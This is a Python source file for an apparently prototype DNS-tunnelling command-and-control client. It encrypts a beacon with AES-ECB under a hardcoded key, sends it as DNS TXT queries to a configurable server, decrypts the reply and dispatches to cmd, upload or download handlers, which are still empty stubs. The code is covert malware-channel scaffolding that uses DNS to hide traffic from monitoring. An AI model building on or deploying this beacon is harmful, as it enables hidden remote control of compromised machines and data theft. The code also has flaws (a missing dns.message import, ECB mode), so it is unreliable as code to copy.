import dns.resolver
import  re
import base64
from Crypto.Cipher import AES

class Client:
    def __init__(self,host,port):
        self.host=host
        self.port=port

    def beikon(self):
        hk={'cmd':self.cmd,'upload':self.upload,'download':self.download}
        demo='demo'
        demo=self.jiami(demo)
        bbc=self.fs(demo)
        kk=self.zz(bbc)
        jm=self.jiemi(kk.encode('utf-8'))
        if jm:
            g='ok'
            demo = self.jiami(g)
            print(demo)
            bbc = self.fs(demo)
            kk = self.zz(bbc)
            jm = self.jiemi(kk.encode('utf-8'))
            if jm in hk:
                hk[jm]()


    def fs(self,data):
        dns_query = dns.message.make_query("{}".format(data), dns.rdatatype.TXT)
        response = dns.query.udp(dns_query, self.host, port=int(self.port))
        a=response.to_text()
        return a

    def zz(self,data):
        sb=re.findall('.* 60',str(data))
        return str(sb[0]).replace('. 60','').replace('.com','')

    def add_to_16(self,text):
        while len(text) % 16 != 0:
            text += '\0'
        return str.encode(text)

    def jiami(self,data):
        key='DD194FB8BA97C8BFDA635E3CE76809A2'
        text=str(data)
        aes=AES.new(key,AES.MODE_ECB)
        encrypd=str(base64.encodebytes(aes.encrypt(self.add_to_16(text))),encoding='utf-8').replace('\n','')
        return encrypd

    def jiemi(self,data):
        key = 'DD194FB8BA97C8BFDA635E3CE76809A2'
        aes=AES.new(key,AES.MODE_ECB)
        decode_encrypd = aes.decrypt(base64.decodebytes(data))
        return bytes.decode(decode_encrypd).rstrip('\0')


    def cmd(self):
        print(1)

    def upload(self):
        pass

    def download(self):
        pass

if __name__ == '__main__':
    SERVER = "127.0.0.1"  # your DNS server
    PORT = 53  # DNS server port
    obk=Client(host=SERVER,port=PORT)
    obk.beikon()
